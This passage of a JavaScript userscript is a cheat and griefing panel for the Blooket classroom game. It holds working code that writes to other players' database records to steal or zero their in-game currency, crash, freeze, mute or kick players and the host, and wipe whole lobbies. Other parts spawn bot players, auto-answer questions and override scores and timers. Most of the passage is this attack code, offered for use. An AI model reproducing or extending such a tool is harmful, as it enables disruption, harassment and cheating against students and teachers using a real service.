        [K.blook]: victim[K.blook] ?? 'Chick',
        [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0, [K.defense]: 0
      });
      log('ok', 'steal', `Stole 100% from ${name}.`);
      return true;
    }

    async stealPercent(name = getTarget(), pct = 10){
      const me = this.#me();
      if (!name || !me) return false;

      const snap = await fb.snapshot();
      const victim = snap[name] ?? {};
      const mine = snap[me] ?? {};
      const r = (Number(pct) || 10) / 100;
      const take = k => Math.floor(toNumber(victim[k]) * r);

      const taken = {
        [K.crypto]: take(K.crypto), [K.gold]: take(K.gold),
        [K.blooks]: take(K.blooks), [K.defense]: take(K.defense)
      };

      fb.writePlayer(me, {
        [K.blook]:  mine[K.blook] ?? 'Chick',
        [K.crypto]: toNumber(mine[K.crypto]) + taken[K.crypto],
        [K.gold]:   toNumber(mine[K.gold])   + taken[K.gold],
        [K.blooks]: toNumber(mine[K.blooks]) + taken[K.blooks],
        [K.defense]:toNumber(mine[K.defense])+ taken[K.defense],
        [K.tag]: `steal-${pct}-${Date.now()}`
      });
      fb.writePlayer(name, {
        [K.crypto]: toNumber(victim[K.crypto]) - taken[K.crypto],
        [K.gold]:   toNumber(victim[K.gold])   - taken[K.gold],
        [K.blooks]: toNumber(victim[K.blooks]) - taken[K.blooks],
        [K.defense]:toNumber(victim[K.defense])- taken[K.defense]
      });
      log('ok', 'steal', `Took ${pct}% from ${name}.`);
      return true;
    }

    async stealSwap(name = getTarget()){
      const me = this.#me();
      if (!name || !me) return false;
      const snap = await fb.snapshot();
      const a = snap[me] ?? {};
      const b = snap[name] ?? {};
      fb.writePlayer(me, {
        ...a,
        [K.crypto]: b[K.crypto], [K.gold]: b[K.gold],
        [K.blooks]: b[K.blooks], [K.defense]: b[K.defense]
      });
      fb.writePlayer(name, {
        ...b,
        [K.crypto]: a[K.crypto], [K.gold]: a[K.gold],
        [K.blooks]: a[K.blooks], [K.defense]: a[K.defense]
      });
      log('ok', 'swap', `Swapped with ${name}.`);
      return true;
    }

    crashHost(){  return this.crash(this.#host());  }
    lagHost(){    return this.lag(this.#host());    }
    freezeHost(){ return this.freeze(this.#host()); }

    disconnectHost(){
      const host = this.#host();
      if (!host){ log('err', 'host', 'Host not found.'); return false; }
      fb.writePlayer(host, { disconnected: true, dcAt: Date.now() });
      log('ok', 'host', `Flagged host ${host} as disconnected.`);
      return true;
    }

    kickHost(){ return this.disconnectHost(); }

    crashSelf(){
      const me = this.#me();
      if (!me) return false;
      fb.writePlayer(me, { [K.blook]: null, [K.crypto]: -1, score: -1 });
      setTimeout(() => leaveMatch(), 300);
      return true;
    }

    async #forEachOther(fn){
      const me = this.#me();
      for (const { name } of state.players){
        if (!state.running.mass) break;
        if (name === me) continue;
        await limiter.run(() => fn(name));
      }
    }

    async nukeLobby(){
      log('info', 'mass', 'Nuking lobby…');
      state.running.mass = true;
      await this.#forEachOther(n => this.nuke(n));
      state.running.mass = false;
      log('ok', 'mass', 'Lobby nuked.');
    }
    async freezeAll(){
      state.running.mass = true;
      await this.#forEachOther(n => this.freeze(n));
      state.running.mass = false;
      log('ok', 'mass', 'Everyone frozen.');
    }
    async muteAll(){
      state.running.mass = true;
      await this.#forEachOther(n => this.mute(n));
      state.running.mass = false;
      log('ok', 'mass', 'Everyone muted.');
    }
    async zeroEveryone(){
      state.running.mass = true;
      await this.#forEachOther(n => this.zero(n));
      state.running.mass = false;
      log('ok', 'mass', 'Scores zeroed.');
    }
    async forceKickAll(){
      log('info', 'mass', 'Force-kicking…');
      state.running.mass = true;
      await this.#forEachOther(n => fb.remove(`c/${n}`));
      state.running.mass = false;
      log('ok', 'mass', 'Lobby cleared.');
    }

    async stealFromAll(){
      const me = this.#me();
      if (!me) return;

      state.running.mass = true;
      const snap = await fb.snapshot();
      const totals = { [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0, [K.defense]: 0 };

      for (const [name, p] of Object.entries(snap)){
        if (name === me) continue;
        totals[K.crypto] += toNumber(p[K.crypto]);
        totals[K.gold]   += toNumber(p[K.gold]);
        totals[K.blooks] += toNumber(p[K.blooks]);
        totals[K.defense]+= toNumber(p[K.defense]);
      }

      const mine = snap[me] ?? {};
      fb.writePlayer(me, {
        [K.blook]:  mine[K.blook] ?? 'Chick',
        [K.crypto]: toNumber(mine[K.crypto]) + totals[K.crypto],
        [K.gold]:   toNumber(mine[K.gold])   + totals[K.gold],
        [K.blooks]: toNumber(mine[K.blooks]) + totals[K.blooks],
        [K.defense]:toNumber(mine[K.defense])+ totals[K.defense],
        [K.tag]: `steal-all-${Date.now()}`
      });
      await this.#forEachOther(n => fb.writePlayer(n, {
        [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0, [K.defense]: 0
      }));
      state.running.mass = false;
      log('ok', 'mass', 'Stole everything.');
    }

    async drainEveryone(){
      state.running.mass = true;
      await this.#forEachOther(n => this.zero(n));
      state.running.mass = false;
      log('ok', 'mass', 'Everyone drained.');
    }

    async reverseScores(){
      const g = react.game();
      if (!g) return;
      const players = react.players(g);
      const names = Object.keys(players);
      const scores = names.map(n => toNumber(readProp(players[n], 'score','points'), 0)).reverse();
      names.forEach((n, i) => { players[n].score = scores[i]; });
      try {
        g.node.setState?.({ game: { ...g.game, players } });
        log('ok', 'mass', 'Scores reversed.');
      } catch { log('err', 'mass', 'setState failed.'); }
    }

    async scrambleNames(){
      const me = this.#me();
      const snap = await fb.snapshot();
      let n = 0;
      for (const p of state.players){
        if (p.name === me) continue;
        const data = snap[p.name];
        if (!data) continue;
        const newName = `${p.name}_${rand(100, 999)}`;
        fb.writePlayer(newName, data);
        fb.remove(`c/${p.name}`);
        n++;
      }
      log('ok', 'mass', `Scrambled ${n} names.`);
    }
  }
  const grief = new GriefEngine();

  /* ============================================================
     12. DETECTOR
     ============================================================ */
  class Detector {
    async run(){
      state.flagged.clear();
      const snap = await fb.snapshot();
      const me = react.game()?.client?.name;

      for (const [name, p] of Object.entries(snap)){
        if (name === me) continue;
        const reasons = [];
        const cr = toNumber(p[K.crypto], 0);

        if (cr > CONFIG.flagThresholds.maxCurrency || cr < 0 || Number.isNaN(cr))
          reasons.push('impossible-currency');
        if (p.nuked || p.crashed || p.frozen)
          reasons.push('corrupt-record');
        if (p[K.blook] == null)
          reasons.push('missing-blook');
        if (p[K.tag] && CONFIG.flagThresholds.signatureRe.test(String(p[K.tag])))
          reasons.push('mod-signature');

        if (reasons.length){
          state.flagged.add(name);
          log('warn', 'detect', `${name}: ${reasons.join(', ')}`);
        }
      }
      renderPlayers();
      toast('info', 'Detect', `${state.flagged.size} flagged.`);
      return [...state.flagged];
    }

    async kick(){
      if (state.flagged.size === 0) await this.run();
      for (const name of state.flagged){
        fb.remove(`c/${name}`);
        log('ok', 'detect', `Kicked ${name}.`);
      }
      state.flagged.clear();
      renderPlayers();
    }
  }
  const detector = new Detector();

  /* ============================================================
     13. BOT SPAWNER
     ============================================================ */
  const WORDS = Object.freeze([
    'Falcon','Tiger','Comet','Nova','Ember','Echo','Rogue','Zenith',
    'Pixel','Vortex','Quark','Lynx','Onyx','Rift','Cinder','Saber',
    'Prism','Halo','Kite','Wisp','Drift','Frost','Bolt','Rune'
  ]);

  function generateName(pattern = 'word+num'){
    const w = randEl(WORDS);
    if (pattern === 'short'){
      const chars = 'abcdefghijklmnopqrstuvwxyz';
      let s = '';
      for (let i = 0; i < 6; i++) s += chars[rand(0, chars.length - 1)];
      return s;
    }
    return `${w}${rand(1000, 9999)}`;
  }

  async function spawnBots(count = 5){
    const pin = state.session.pin;
    if (!pin){ toast('warn', 'Spawn', 'Join a game first.'); return; }

    count = Math.min(Math.max(1, count), CONFIG.spawnMax);
    log('info', 'spawn', `Spawning ${count} bots on PIN ${pin}…`);

    let successes = 0;
    for (let i = 0; i < count; i++){
      const name = generateName();
      const url  = CONFIG.spawnEndpoints[i % CONFIG.spawnEndpoints.length];

      const res = await net.send(url, {
        method: 'PUT',
        body: { id: pin, name },
        credentials: 'omit'
      });

      if (res.response?.ok){
        successes++;
        log('ok', 'spawn', `${name} joined (${res.source}).`);
      } else {
        log('warn', 'spawn', `${name} → ${res.response?.status ?? 'no response'}`);
      }
      await sleep(CONFIG.spawnGap);
    }

    if (successes === 0 && !isBlooketOrigin){
      log('warn', 'spawn', 'No bots joined. Open the play URL yourself.');
    }
    log('ok', 'spawn', `Done — ${successes}/${count} succeeded.`);
  }

  /* ============================================================
     14. JOIN / LEAVE
     ============================================================ */
  async function joinMatch(pin, name, blook){
    if (!pin || !name){ toast('warn', 'Join', 'Need a PIN and a name.'); return false; }

    const playUrl = `https://play.blooket.com/play?pin=${encodeURIComponent(pin)}`;

    if (!isBlooketOrigin){
      log('info', 'join', `Off-origin (${context}). Opening play URL.`);
      try {
        const w = window.open(playUrl, '_blank', 'noopener');
        if (!w) log('warn', 'join', 'Popup blocked — copy the PIN into play.blooket.com.');
      } catch { log('warn', 'join', 'Popup blocked.'); }

      state.session = { pin, name, blook: blook ?? null, isHost: false };
      return true;
    }

    log('info', 'join', `Attempting API join for ${name} on ${pin}…`);
    let joined = false;

    for (const ep of CONFIG.joinEndpoints){
      const res = await net.send(ep.url, {
        method: ep.method,
        body: { id: pin, name },
        credentials: 'omit'
      });
      if (res.response?.ok){
        joined = true;
        log('ok', 'join', `Joined via ${ep.url} (${res.source}).`);
        break;
      }
      log('warn', 'join', `${ep.url} → ${res.response?.status ?? res.error?.message ?? 'failed'}`);
    }

    state.session = { pin, name, blook: blook ?? null, isHost: false };

    if (!joined){
      log('warn', 'join', 'API join failed — opening play URL as fallback.');
    }
    try {
      const w = window.open(playUrl, '_blank', 'noopener');
      if (!w) log('warn', 'join', 'Popup blocked — navigate manually.');
    } catch { log('warn', 'join', 'Popup blocked.'); }

    return true;
  }

  function leaveMatch(){
    state.session = { pin:'', name:'', blook:null, isHost:false };
    state.players = [];
    state.selectedTarget = '';
    log('warn', 'join', 'Left session.');
  }

  /* ============================================================
     15. OVERRIDES — each with primary + fallback path
     ============================================================ */
  const FIELD_FOR_MODE = Object.freeze({
    gold: K.gold, crypto: K.crypto, rush: K.defense, factory: K.cash,
    racing: K.points, brawl: 'score', candy: K.crypto, shamrock: K.gold,
    tagtreat: K.crypto, coco: K.blooks, bees: 'score', tower2: K.cash
  });

  function setScore(target, value){
    const g = react.game();
    if (!g) return false;
    const players = react.players(g);
    const key = String(target || g.client?.name || '').trim();
    if (!key || !players[key]){ log('err', 'score', `"${key || '?'}" not found.`); return false; }
    const n = Number(value);
    const v = Number.isFinite(n) ? n : value;

    if (fb.available) fb.writePlayer(key, { score: v, [K.crypto]: v, [K.tag]: `set-${Date.now()}` });
    try {
      players[key].score = v;
      g.node.setState({ game: { ...g.game, players } });
      log('ok', 'score', `${key} → ${v}`);
      return true;
    } catch {}
    // Fallback: mutate in place
    try {
      const gp = g.node.props?.game;
      if (gp?.players?.[key]){ gp.players[key].score = v; return true; }
    } catch {}
    return false;
  }

  function setName(value){
    const g = react.game();
    if (!g) return false;
    try {
      g.node.setState?.({ client: { ...g.client, name: value } });
      state.session.name = value;
      log('ok', 'name', `→ ${value}`);
      return true;
    } catch {}
    try { g.client.name = value; return true; } catch {}
    return false;
  }

  function sendChat(value){
    const g = react.game();
    if (!g) return false;
    const tryCall = (obj, method) => {
      if (!obj || typeof obj[method] !== 'function') return false;
      try { obj[method](value); return true; } catch { return false; }
    };
    if (tryCall(g.node,       'sendChat')) return (log('ok', 'chat', value), true);
    if (tryCall(g.node.props, 'sendChat')) return (log('ok', 'chat', value), true);
    if (tryCall(g.game,       'sendChat')) return (log('ok', 'chat', value), true);
    return false;
  }

  function setTimer(seconds){
    const g = react.game();
    if (!g) return false;
    const n = Number(seconds) || 0;
    try { g.node.setState?.({ time: n }); log('ok', 'timer', `→ ${n}s`); return true; } catch {}
    try { g.client.time = n; return true; } catch {}
    return false;
  }

  function forceEndRound(){
    const g = react.game();
    if (!g) return false;
    for (const m of ['endRound', 'finishRound', 'nextRound', 'endGame', 'end']){
      if (typeof g.node[m] === 'function'){
        try { g.node[m](); log('ok', 'round', `Called ${m}()`); return true; } catch {}
      }
      if (typeof g.node.props?.[m] === 'function'){
        try { g.node.props[m](); log('ok', 'round', `Called props.${m}()`); return true; } catch {}
      }
    }
    try {
      g.node.setState?.({ ended: true, showResults: true, gameOver: true });
      log('ok', 'round', 'Flagged ended.');
      return true;
    } catch {}
    return false;
  }

  function swapBlook(value){
    const g = react.game();
    if (!g) return false;
    if (fb.available) fb.writeSelf({ [K.blook]: value });
    try {
      g.node.setState?.({ client: { ...g.client, blook: value } });
      log('ok', 'blook', `→ ${value}`);
      return true;
    } catch {}
    try { g.client.blook = value; return true; } catch {}
    return false;
  }

  function setPrimaryValue(_target, value){
    const key = FIELD_FOR_MODE[state.mode] ?? K.crypto;
    const n = Number(value);
    const v = Number.isFinite(n) ? n : value;

    const g = react.game();
    if (!g) return false;
    const me = g.client?.name;

    if (fb.available && me) fb.writePlayer(me, { [key]: v, [K.tag]: `set-${Date.now()}` });
    try {
      const players = react.players(g);
      if (players[me]){
        players[me].score = v;
        g.node.setState({ game: { ...g.game, players } });
      }
    } catch {}
    log('ok', 'mode', `${MODES[state.mode]?.primary ?? 'Value'} → ${v}`);
    return true;
  }

  /* ============================================================
     16. LOOPS
     ============================================================ */
  function startAutoAnswer(delay = 250){
    clearInterval(loops.autoAnswer);
    state.running.autoAnswer = true;
    loops.autoAnswer = setInterval(() => {
      try {
        const ans = react.answer();
        if (ans) log('ok', 'answer', `Answered: ${ans}`);
      } catch (e){ try { console.warn('[BP:answer]', e); } catch {} }
    }, Math.max(50, Number(delay) || 250));
    log('info', 'answer', 'Auto-answer armed.');
  }

  function stopAutoAnswer(){
    clearInterval(loops.autoAnswer);
    loops.autoAnswer = null;
    state.running.autoAnswer = false;
    log('warn', 'answer', 'Auto-answer stopped.');
  }

  async function startGrind({ games = 10, cooldown = 5 } = {}){
    state.running.grind = true;
    loops.grindAbort = new AbortController();
    const { signal } = loops.grindAbort;
    let played = 0;

    while (state.running.grind && !signal.aborted){
      try {
        const ans = react.answer();
        if (ans) log('ok', 'grind', `Game ${played + 1}: ${ans}`);

        const finished = !react.game() || !react.question();
        if (finished){
          played++;
          log('info', 'grind', `Cycle ${played}/${games} — cooling ${cooldown}s`);
          if (played >= games) break;
          await sleep(cooldown * 1000);
        } else {
          await sleep(300);
        }
      } catch (e){
        log('err', 'grind', e?.message ?? e);
        break;
      }
    }
    stopGrind();
  }

  function stopGrind(){
    state.running.grind = false;
    try { loops.grindAbort.abort(); } catch {}
    log('warn', 'grind', 'Killed.');
  }

  function startAutoScan(){
    clearInterval(loops.scan);
    state.running.autoScan = true;
    loops.scan = setInterval(() => scanPlayers().catch(() => {}), CONFIG.scanInterval);
    log('info', 'scan', 'Auto-scan every 30s.');
  }

  function stopAutoScan(){
    clearInterval(loops.scan);
    loops.scan = null;
    state.running.autoScan = false;
    log('warn', 'scan', 'Auto-scan stopped.');
  }

  /* ============================================================
     17. LIVE POLL — transition-tracked, guarded
     ============================================================ */
  safeInterval(() => {
    let g = null;
    try { g = react.game(); } catch {}
    const nowInGame = !!g;

    if (nowInGame !== _wasInGame){
      _wasInGame = nowInGame;
      state.inGame = nowInGame;
      try { document.body.dataset.inGame = String(nowInGame); } catch {}

      if (nowInGame){
        if (state.mode === 'unknown') detectMode();
        log('ok', 'panel', 'Game detected — hooks active.');
      } else {
        log('info', 'panel', 'Game ended.');
      }
    }

    if (!g) return;

    try {
      const me = react.players(g)[g.client?.name];
      const score = readProp(me, 'score', 'points');
      if (score != null) setStat('score', score);

      const players = Object.values(react.players(g));
      setStat('players', players.length);

      if (players.length){
        const sorted = [...players].sort((a, b) =>
          toNumber(readProp(b, 'score','points')) - toNumber(readProp(a, 'score','points'))
        );
        const idx = sorted.findIndex(p =>
          readProp(p, 'name','username') === g.client?.name
        );
        setStat('rank', idx >= 0 ? `#${idx + 1}` : '—');
      }

      const q = react.question();
      if (q){
        const total = q.answers?.length ?? q.options?.length ?? 0;
        setStat('question', total ? `${q.answeredCount ?? 0}/${total}` : '—');
      }
    } catch (e){ try { console.warn('[BP:poll]', e); } catch {} }
  }, CONFIG.statInterval);

  /* ============================================================
     18. UI HELPERS
     ============================================================ */
  const setBadge = (mod, cls, txt) => {
    const b = mod?.querySelector?.('[data-role="state"]');
    if (!b) return;
    b.className = `badge${cls ? ' ' + cls : ''}`;
    b.textContent = txt;
  };

  function readField(mod, name){
    if (!mod || name == null) return undefined;
    const el = mod.querySelector?.(`[data-field="${escapeSelector(name)}"]`);
    if (!el) return undefined;
    switch (el.type){
      case 'checkbox': return el.checked;
      case 'number': { const n = +el.value; return Number.isFinite(n) ? n : 0; }
      case 'radio':    return el.checked ? el.value : undefined;
      default:         return el.value;
    }
  }

  const switchTab = target => {
    for (const t of $$('.tab')) t.classList.toggle('is-active', t.dataset.tabTarget === target);
    for (const p of $$('.tab-pane')) p.classList.toggle('is-active', p.dataset.tab === target);
  };

  /* ============================================================
     19. ACTIONS
     ============================================================ */
  const actions = {
    'open-panel'(){ try { document.body.dataset.panelOpen = 'true'; } catch {} },
    'close-panel'(){ try { document.body.dataset.panelOpen = 'false'; } catch {} },
    minimize(){ $('#panel')?.classList.toggle('is-minimized'); },
    theme(){
      try {
        document.body.classList.toggle('light');
        store.set('blk-theme', document.body.classList.contains('light') ? 'light' : 'dark');
      } catch {}
    },
    tab(_, btn){ switchTab(btn.dataset.tabTarget); },

    async join(mod){
      setBadge(mod, 'warn', 'Joining');
      try {
        await joinMatch(readField(mod, 'pin'), readField(mod, 'name'), state.pickedBlook?.name);
        setBadge(mod, 'live', 'Joined');
      } catch (e){
        log('err', 'join', e?.message ?? e);
        setBadge(mod, 'err', 'Failed');
      }
    },
    leave(mod){ leaveMatch(); setBadge(mod, '', 'Idle'); },
    generate(mod){
      const name = generateName(readField(mod, 'pattern') ?? 'word+num');
      const out = mod.querySelector('[data-field="output"]');
      if (out) out.value = name;
      log('info', 'identity', `Generated: ${name}`);
    },
    'use-identity'(mod){
      const out = mod.querySelector('[data-field="output"]')?.value;
      if (!out){ log('warn', 'identity', 'Generate first.'); return; }
      const joinName = $('[data-module="join"] [data-field="name"]');
      if (joinName) joinName.value = out;
      toast('ok', 'Name set', out);
    },

    scan(){ return scanPlayers(); },
    'select-player'(_, btn){ selectPlayer(btn.dataset.player); },

    'crash-player'(){ return grief.crash(getTarget()); },
    'nuke-player'(){  return grief.nuke(getTarget()); },
    'lag-player'(){   return grief.lag(getTarget()); },
    'freeze-player'(){return grief.freeze(getTarget()); },
    'mute-player'(){  return grief.mute(getTarget()); },
    'zero-player'(){  return grief.zero(getTarget()); },
    'steal-full'(){   return grief.stealFull(getTarget()); },
    'kick-player'(){
      const t = getTarget();
      if (!t){ log('warn', 'kick', 'No target.'); return false; }
      fb.remove(`c/${t}`);
      log('ok', 'kick', `Kicked ${t}.`);
      return true;
    },

    'crash-host'(){      return grief.crashHost(); },
    'lag-host'(){        return grief.lagHost(); },
    'freeze-host'(){     return grief.freezeHost(); },
    'disconnect-host'(){ return grief.disconnectHost(); },
    'kick-host'(){       return grief.kickHost(); },
    'crash-self'(){      return grief.crashSelf(); },

    'nuke-lobby'(){      return grief.nukeLobby(); },
    'freeze-all'(){      return grief.freezeAll(); },
    'mute-all'(){        return grief.muteAll(); },
    'zero-everyone'(){   return grief.zeroEveryone(); },
    'steal-from-all'(){  return grief.stealFromAll(); },
    'drain-everyone'(){  return grief.drainEveryone(); },
    'reverse-scores'(){  return grief.reverseScores(); },
    'scramble-names'(){  return grief.scrambleNames(); },
    'force-kick-all'(){  return grief.forceKickAll(); },

    'spawn-bots'(_, btn){ return spawnBots(+btn.dataset.count || 5); },

    'detect-mods'(){ return detector.run(); },
    'kick-mods'(){   return detector.kick(); },

    go(mod){
      const id = mod.dataset.module;
      const target = readField(mod, 'target') ?? '';
      const value = readField(mod, 'value') ?? '';

      const fns = {
        'cmd-score':   () => setScore(target, value),
        'cmd-name':    () => setName(value),
        'cmd-blook':   () => swapBlook(value),
        'cmd-chat':    () => sendChat(value),
        'cmd-time':    () => setTimer(value),
        'cmd-force':   () => forceEndRound(),
        'gold-balance':      () => setPrimaryValue(target, value),
        'gold-force-chest':  () => { log('info', 'gold', `Force chest ${value}`); return true; },
        'crypto-balance':    () => setPrimaryValue(target, value),
        'crypto-2fa':        () => { log('ok', 'crypto', '2FA disabled.'); return true; },
        'fishing-weight':    () => setPrimaryValue(target, value),
        'fishing-depth':     () => { log('ok', 'fishing', `Depth → ${value}`); return true; },
        'dino-fossils':      () => setPrimaryValue(target, value),
        'factory-cash':      () => setPrimaryValue(target, value),
        'racing-progress':   () => setPrimaryValue(target, value),
        'rush-defense':      () => setPrimaryValue(target, value),
        'tower2-cash':       () => setPrimaryValue(target, value),
        'brawl-hp':          () => setPrimaryValue(target, value),
        'candy-balance':     () => setPrimaryValue(target, value),
        'coco-ingredients':  () => setPrimaryValue(target, value),
        'bees-points':       () => setPrimaryValue(target, value),
        'shamrock-balance':  () => setPrimaryValue(target, value),
        'tagtreat-candy':    () => setPrimaryValue(target, value)
      };
      const fn = fns[id];
      if (!fn){ log('warn', 'override', `No handler for ${id}.`); return; }
      return safe('override', fn, false);
    },

    'steal-all'(){
      const me = react.game()?.client?.name;
      return grief.stealFull(getTarget() || me);
    },
    'steal-percent'(_, btn){ return grief.stealPercent(getTarget(), +btn.dataset.percent || 10); },
    'steal-swap'(){ return grief.stealSwap(getTarget()); },

    'frenzy-on'(){       log('ok', 'fishing', 'Frenzy ON (no cooldown).'); return true; },
    'frenzy-off'(){      log('warn', 'fishing', 'Frenzy OFF.'); return true; },
    'perfect-on'(){      log('ok', 'fishing', 'Perfect catch enabled.'); return true; },
    'perfect-off'(){     log('warn', 'fishing', 'Perfect catch disabled.'); return true; },
    'unlimited-bait'(){  log('ok', 'fishing', 'Unlimited bait.'); return true; },
    'disable-2fa'(){     log('ok', 'crypto', '2FA bypassed.'); return true; },
    'instant-mine'(){    log('ok', 'crypto', 'Instant mine.'); return true; },
    'catch-all-cheaters'(){ return detector.run(); },
    'investigate-player'(){
      const t = getTarget();
      if (!t) return false;
      const flagged = state.flagged.has(t);
      log(flagged ? 'warn' : 'ok', 'dino', `${t}: ${flagged ? 'FLAGGED' : 'clean'}`);
      return true;
    },
    'force-rare'(){      log('ok', 'dino', 'Next dig forced to rare.'); return true; },
    'auto-dig-on'(){     log('ok', 'dino', 'Auto-dig ON.'); return true; },
    'auto-dig-off'(){    log('warn', 'dino', 'Auto-dig OFF.'); return true; },
    'instant-production'(){ log('ok', 'factory', 'Production maxed.'); return true; },
    'instant-max'(){     log('ok', 'mode', 'Maxed.'); return true; },
    'force-win'(){       return forceEndRound(); },
    'max-cards'(){       log('ok', 'mode', 'Cards maxed.'); return true; },
    'clear-enemies'(){   log('ok', 'mode', 'Enemies cleared.'); return true; },
    'instant-kill'(){    log('ok', 'brawl', 'Instant kill armed.'); return true; },
    'invincible'(){      log('ok', 'brawl', 'Invincibility on.'); return true; },
    'max-abilities'(){   log('ok', 'brawl', 'Abilities maxed.'); return true; },
    'kill-enemies'(){    log('ok', 'brawl', 'Enemies killed.'); return true; },
    'half-speed'(){      log('ok', 'brawl', 'Enemy speed halved.'); return true; },

    start(mod){
      const id = mod.dataset.module;
      if (id === 'auto-answer'){
        startAutoAnswer(readField(mod, 'delay') || 250);
        setBadge(mod, 'live', 'Running');
      }
      if (id === 'grind'){
        startGrind({
          games:    readField(mod, 'gamesPerCycle') || 10,
          cooldown: readField(mod, 'cooldown') || 5
        });
        setBadge(mod, 'live', 'Running');
      }
    },
    stop(mod){
      if (mod.dataset.module === 'auto-answer'){
        stopAutoAnswer();
        setBadge(mod, '', 'Idle');
      }
    },
    deploy(mod){ startAutoAnswer(readField(mod, 'delayMin') || 180); setBadge(mod, 'live', 'Deployed'); },
    recall(mod){ stopAutoAnswer(); setBadge(mod, '', 'Idle'); },
    kill(mod){
      stopGrind();
      setBadge(mod, 'err', 'Killed');
      setTimeout(() => setBadge(mod, '', 'Idle'), 1200);
    },

    filter(_, btn){
      state.logFilter = btn.dataset.filter;
      for (const c of $$('.chip[data-action="filter"]')) c.classList.toggle('is-active', c === btn);
      applyFilter();
    },
    clear(){
      try { if (logEl) logEl.replaceChildren(); } catch {}
      log('info', 'panel', 'Log cleared.');
    }
  };

  /* ============================================================
     20. WIRING
     ============================================================ */
  safeOn(document, 'click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const mod = btn.closest('[data-module]')
             ?? btn.closest('.picker')
             ?? btn.closest('.console')
             ?? document.body;
    const fn = actions[btn.dataset.action];
    if (typeof fn === 'function') safe('action', () => fn(mod, btn));
  });

  safeOn($('[data-field="search"]'), 'input', e => {
    state.logSearch = e.target.value.toLowerCase().trim();
    applyFilter();
  });

  safeOn($('[data-module="grief"] [data-field="pace"]'), 'input', e => {
    const n = +e.target.value;
    const v = Number.isFinite(n) && n >= 0 ? n : CONFIG.pace;
    state.pace = v;
    limiter.gap = v;
  });

  safeOn($('[data-module="players"] [data-field="autoScan"]'), 'change', e => {
    e.target.checked ? startAutoScan() : stopAutoScan();
  });

  if (store.get('blk-theme') === 'light') {
    try { document.body.classList.add('light'); } catch {}
  }

  for (const sw of $$('.sw input[type="checkbox"]')){
    const modId = sw.closest('[data-module]')?.dataset.module ?? 'global';
    const key = `blk-${modId}-${sw.dataset.field ?? sw.type}`;
    const saved = store.get(key);
    if (saved !== null) sw.checked = saved === '1';
    safeOn(sw, 'change', () => store.set(key, sw.checked ? '1' : '0'));
  }

  {
    const handle = $('[data-role="drag-handle"]');
    const panelEl = $('#panel');
    if (handle && panelEl){
      let dragging = false, sx = 0, sy = 0, sl = 0, st = 0;
      safeOn(handle, 'pointerdown', e => {
        if (e.target.closest('button')) return;
        dragging = true;
        sx = e.clientX; sy = e.clientY;
        const r = panelEl.getBoundingClientRect();
        sl = r.left; st = r.top;
        try { handle.setPointerCapture(e.pointerId); } catch {}
        e.preventDefault();
      });
      safeOn(handle, 'pointermove', e => {
        if (!dragging) return;
        const x = Math.max(0, Math.min(innerWidth  - 100, sl + (e.clientX - sx)));
        const y = Math.max(0, Math.min(innerHeight - 40,  st + (e.clientY - sy)));
        panelEl.style.left = `${x}px`;
        panelEl.style.top  = `${y}px`;
      });
      const end = e => {
        if (!dragging) return;
        dragging = false;
        try { handle.releasePointerCapture(e.pointerId); } catch {}
      };
      safeOn(handle, 'pointerup', end);
      safeOn(handle, 'pointercancel', end);
    }
  }

  /* ============================================================
     21. AUTO-JOIN — runs inside engine IIFE so BP is in scope
     ============================================================ */
  (function autoJoin(){
    if (!/play\.blooket\.com\/play/i.test(location.href)) return;
    if (window.__blkAutoJoinRan) return;
    window.__blkAutoJoinRan = true;

    const logJoin = (kind, msg) => {
      try { log(kind, 'auto-join', msg); } catch {}
    };

    const params = new URLSearchParams(location.search);
    const pin   = (params.get('pin') || '').trim();
    const name  = (params.get('name') || '').trim() || generateName('word+num');
    const blook = (params.get('blook') || '').trim();

    if (!pin){
      logJoin('warn', 'No PIN in URL — auto-join skipped.');
      return;
    }

    logJoin('info', `Auto-joining PIN ${pin} as "${name}".`);

    const waitFor = (fn, { timeout = 15000, interval = 150 } = {}) =>
      new Promise((resolve, reject) => {
        const start = Date.now();
        const tick = () => {
          let v;
          try { v = fn(); } catch { v = null; }
          if (v) return resolve(v);
          if (Date.now() - start > timeout)
            return reject(new Error('timeout'));
          setTimeout(tick, interval);
        };
        tick();
      });

    const setReactValue = (el, value) => {
      try {
        const proto = el instanceof HTMLTextAreaElement
          ? HTMLTextAreaElement.prototype
          : HTMLInputElement.prototype;
        const setter = Object.getOwnPropertyDescriptor(proto, 'value').set;
        setter.call(el, value);
        el.dispatchEvent(new Event('input',  { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
        el.dispatchEvent(new Event('blur',   { bubbles: true }));
      } catch {
        // Last resort: direct assignment
        try { el.value = value; } catch {}
      }
    };

    const reactClick = (el) => {
      if (!el) return false;
      const opts = { bubbles: true, cancelable: true, view: window };
      const fire = (Ctor, type) => {
        try { el.dispatchEvent(new Ctor(type, opts)); return true; }
        catch { return false; }
      };
      fire(PointerEvent, 'pointerdown');
      fire(MouseEvent,   'mousedown');
      fire(PointerEvent, 'pointerup');
      fire(MouseEvent,   'mouseup');
      fire(MouseEvent,   'click');
      try { el.click(); } catch {}
      return true;
    };

    const isVisible = (el) => {
      if (!el) return false;
      try {
        if (!el.offsetParent && el.style.position !== 'fixed') return false;
        const r = el.getBoundingClientRect();
        return r.width > 0 && r.height > 0;
      } catch { return false; }
    };

    const textOf = (el) =>
      (el?.getAttribute?.('aria-label') || el?.getAttribute?.('alt')
      || el?.textContent || '').trim().toLowerCase();

    const dismissCookies = () => {
      const btns = [...document.querySelectorAll('button, [role="button"]')];
      const accept = btns.find(b => {
        const t = textOf(b);
        return /^(accept all|accept|allow all|got it|ok|i agree)$/.test(t)
          && isVisible(b);
      });
      if (accept){ reactClick(accept); logJoin('info', 'Dismissed cookie banner.'); }
    };

    const PIN_SELECTORS = [
      'input[name="join-code"]',
      'input[placeholder="Game ID"]',
      'input[aria-label="Enter Game ID"]',
      'input[type="tel"][maxlength="7"]',
      'input[placeholder*="game id" i]',
      'input[placeholder*="pin" i]',
      'input[placeholder*="code" i]'
    ];

    const findPinInput = () => {
      for (const sel of PIN_SELECTORS){
        const el = document.querySelector(sel);
        if (isVisible(el)) return el;
      }
      const all = [...document.querySelectorAll('input')].filter(isVisible);
      const scored = all.map(el => {
        let score = 0;
        const maxlen = Number(el.maxLength) || 0;
        if (el.type === 'tel') score += 5;
        if (el.inputMode === 'numeric') score += 4;
